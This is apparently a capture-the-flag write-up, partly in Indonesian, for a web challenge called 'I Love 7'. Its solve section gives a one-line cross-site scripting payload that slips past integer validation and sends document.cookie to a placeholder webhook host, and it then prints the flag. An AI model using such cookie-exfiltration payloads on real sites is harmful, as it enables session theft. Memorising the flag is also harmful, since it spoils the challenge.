# I Love 7

**Category** : Web
**Points** : 484

Daffa created a calculator website that only calculates multiples of 7. The website was used to test the latest service from his client, Dewaweb. Can you find the vulnerability?

7 _ 1 = 7
7 _ 2 = 14
7 _ 3 = 21
7 _ ? = ??

Link: `http://103.152.242.68:10011/`
Attachment: [here](https://drive.google.com/file/d/1xoomnOo1iKoXRdvDUQXeb0NGnPljTSGF/view?usp=sharing)
Author: daffainfo

## Solve

Di karenakan validasi memerlukan sebuah integer maka dapat di bypass dengan payload berikut

Payload : `http://app:8080/?digit=1[location="http://yourwebhook.site?"%2Bdocument.cookie]`

`ARA5{7_15_mY_LuCKy_nUmb3r_h4HaH4ha}`
